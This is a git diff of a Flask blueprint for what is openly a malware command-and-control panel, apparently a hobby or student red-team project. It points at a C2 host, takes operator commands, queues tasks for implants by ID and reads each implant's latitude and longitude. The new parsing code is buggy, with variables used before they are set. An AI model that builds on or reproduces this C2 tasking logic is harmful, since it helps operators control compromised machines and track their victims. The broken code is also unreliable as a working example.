@@ -8,7 +8,7 @@ from urllib.parse import urljoin
 from cvnt.client_pb2 import Command, ClientTaskRequest, ClientTaskResponse, Packet
 from cvnt.constants import opcodes, extras
 import requests 
-from cvnt.db_operations import make_task
+from cvnt.db_operations import make_task, get_list, get_implant_by_id
 
 client = Blueprint('client', __name__, template_folder='templates')
 c2 = "https://rigmalwarole.com"
@@ -29,31 +29,40 @@ def index():
     if 'authenticated' not in session or not session['authenticated']:
         return redirect(url_for('basic.login_success'))
     whole = None
-    error_message = None  # Initialize the error message to None
+    response = None 
+    rest_string = ' '
     if form.validate_on_submit():
         whole = form.cmd.data
-        parts = whole.split(' ', 1)
-        leftoverstring = ''
-        try:
-            firstword, leftoverstring = parts
-        except: 
-            firstword = parts[0]
-        if parts[1] in opcodes:
-            msg = Command()
-            msg.cmd = firstword
-            msg.args = leftoverstring
-            print('Slay Baddies your command was received successfully!')
-            handle_task_request("implantIdExample", msg.cmd, msg.args)
-        else if firstword in extras:
-            pass
+        words = whole.split()
+        if len(words) == 1:
+            if words[0] in extras:
+                print('printing??????')
+                implants = get_list()
+                for impl in implants:
+                    curr = get_implant_by_id(impl)
+                    lat = curr.latitude
+                    long = curr.longitude
+            else:
+                response = 'Invalid Command Loser :('
+                cmd = words[0]
+        elif len(words) == 2:
+            if words[1] in opcodes:
+                implant_id = words[0]
+                cmd = words[1]
+                handle_task_request(implant_id, cmd, rest_string)
+            else:
+                response = 'Invalid Command Loser :('
+                cmd = ' '.join(words)
         else:
-            error_message = 'Invalid Command Loser :('  # Set the error message
-    return render_template('index.html', form=form, cmd=whole, error_message=error_message)
-
-def valid_command(cmd):
-    if cmd not in opcodes or cmd not in extras:
-        return False
-    return True
+            if words[1] in opcodes:
+                first_two_words = words[:2]
+                rest_of_words = words[2:]
+                rest_string = ' '.join(rest_of_words)
+                handle_task_request(implant_id, cmd, rest_string)
+            else:
+                response = 'Invalid Command Loser :('  # Set the error message
+                cmd = ' '.join(words)
+    return render_template('index.html', form=form, cmd=whole, response=response)
 
 def analyze_input(cmd, args):
     pass
@@ -68,9 +77,7 @@ def handle_task_request(implant_id, cmd, args):
     tr.TaskID = "sometaskId idk" # needs to be genrerated
     tr.Opcode = to_opcode(cmd)
     tr.args = args
-
     new_task = make_task(implant_id, tr)
-
     print("new task made")
     print(new_task)
     db.session.add(new_task)
